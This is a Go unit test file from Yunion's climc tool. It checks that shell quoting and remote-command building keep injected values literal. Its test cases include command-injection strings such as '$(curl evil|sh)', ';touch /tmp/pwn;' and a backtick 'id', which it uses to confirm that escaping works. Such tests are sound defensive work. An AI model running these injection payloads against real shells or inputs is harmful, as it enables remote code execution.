// Copyright 2019 Yunion
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package command

import (
	"os"
	"os/exec"
	"strings"
	"testing"
)

func TestShellQuote(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"", "''"},
		{"simple", "'simple'"},
		{"a b", "'a b'"},
		{";touch /tmp/pwn;", "';touch /tmp/pwn;'"},
		{"$(curl evil|sh)", "'$(curl evil|sh)'"},
		{"`id`", "'`id`'"},
		{"it's", `'it'\''s'`},
		{"a\nb", "'a\nb'"},
	}
	for _, c := range cases {
		if got := shellQuote(c.in); got != c.want {
			t.Errorf("shellQuote(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestBuildRemoteCmdDefault(t *testing.T) {
	got, err := buildRemoteCmd(nil, "", nil)
	if err != nil {
		t.Fatalf("buildRemoteCmd: %v", err)
	}
	if got != "exec bash" {
		t.Fatalf("default remote cmd = %q, want %q", got, "exec bash")
	}
}

// malicious env values and command args must stay literal data on the remote
// shell, they must not be executed
func TestBuildRemoteCmdInjectionSafe(t *testing.T) {
	payload := "$(touch /tmp/climc_ssh_pwn)"

	remoteCmd, err := buildRemoteCmd(map[string]string{"X": payload}, "env", nil)
	if err != nil {
		t.Fatalf("buildRemoteCmd: %v", err)
	}
	out, err := exec.Command("bash", "-c", remoteCmd).Output()
	if err != nil {
		t.Fatalf("run remote cmd: %v", err)
	}
	if !strings.Contains(string(out), "X="+payload+"\n") {
		t.Fatalf("env value not literal in env output")
	}
	if _, err := os.Stat("/tmp/climc_ssh_pwn"); !os.IsNotExist(err) {
		t.Fatalf("injection payload was executed")
	}

	remoteCmd, err = buildRemoteCmd(nil, "printf", []string{"%s", payload})
	if err != nil {
		t.Fatalf("buildRemoteCmd: %v", err)
	}
	out, err = exec.Command("bash", "-c", remoteCmd).Output()
	if err != nil {
		t.Fatalf("run remote cmd: %v", err)
	}
	if string(out) != payload {
		t.Fatalf("command arg not literal, output %q", string(out))
	}
	if _, err := os.Stat("/tmp/climc_ssh_pwn"); !os.IsNotExist(err) {
		t.Fatalf("injection payload was executed")
	}
}

func TestBuildRemoteCmdInvalidEnvKey(t *testing.T) {
	if _, err := buildRemoteCmd(map[string]string{"K;touch /tmp/pwn": "v"}, "", nil); err == nil {
		t.Fatalf("expected error for invalid env key")
	}
	if _, err := buildRemoteCmd(map[string]string{"9INVALID": "v"}, "", nil); err == nil {
		t.Fatalf("expected error for invalid env key")
	}
}
